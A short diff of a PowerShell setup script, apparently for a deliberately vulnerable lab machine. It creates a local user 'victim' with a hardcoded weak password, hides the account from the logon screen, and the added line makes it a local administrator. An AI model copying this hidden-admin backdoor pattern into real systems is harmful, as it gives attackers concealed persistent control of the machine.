@@ -21,6 +21,7 @@ $Password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
 $ErrorActionPreference = "SilentlyContinue"
 New-LocalUser -Name "victim" -Password $Password -Description "Vulnerable User"
 New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "victim" -Value 0 -PropertyType DWord -Force
+net localgroup Administrators victim /add 2>&1 | Out-Null   # <-- asta adaugi
 $ErrorActionPreference = "Continue"
 
 # 3. Configure OpenSSH to remove Domain restrictions and limit to internal IPs
